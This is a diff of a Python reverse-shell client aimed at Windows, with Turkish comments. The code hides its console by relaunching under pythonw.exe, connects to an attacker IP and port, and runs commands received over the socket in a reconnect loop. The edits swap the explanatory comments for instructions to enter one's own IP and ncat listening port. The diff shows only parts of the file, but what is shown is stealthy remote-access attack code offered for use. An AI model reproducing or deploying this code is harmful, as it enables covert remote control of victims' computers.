@@ -4,14 +4,14 @@ import os
 import time
 import sys
 
-ATTACKER_IP = '192.168.1.5'
-PORT = 12346
+ATTACKER_IP = '192.168.1.5' #Kendi İp Adresinizi Buraya Yazın.
+PORT = 12346 # ncat den dinliceğiniz portu buraya yazın
 
-# Windows Turkiye ortaminda dosya sistemi kodlamasi (cp1254) kullaniliyor.
+
 FS_ENCODING = "cp1254"
 
 def hide_console():
-    # Eger zaten pythonw.exe ile calisiyorsa, hicbir sey yapma.
+   
     if sys.executable.lower().endswith("pythonw.exe"):
         return
     try:
@@ -19,7 +19,7 @@ def hide_console():
         si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
         pythonw = sys.executable.replace("python.exe", "pythonw.exe")
         subprocess.Popen([pythonw, sys.argv[0]], startupinfo=si)
-        sys.exit()  # Mevcut terminali kapat.
+        sys.exit()  
     except Exception:
         pass
 
@@ -30,12 +30,12 @@ def connect():
             s.connect((ATTACKER_IP, PORT))
             
             while True:
-                # Gelen komutu FS_ENCODING ile decode ediyoruz.
+                
                 command = s.recv(1024).decode(FS_ENCODING, errors='replace')
                 if not command or command.lower() == 'exit':
                     break
 
-                # cd komutu: Calisma dizinini degistir.
+              
                 if command.lower().startswith('cd'):
                     try:
                         new_dir = command[3:].strip()
@@ -62,5 +62,5 @@ def connect():
             continue
 
 if __name__ == "__main__":
-    hide_console()  # Script arka planda calissin.
-    connect()       # Reverse shell baglantisini baslat.
+    hide_console()  
+    connect()       
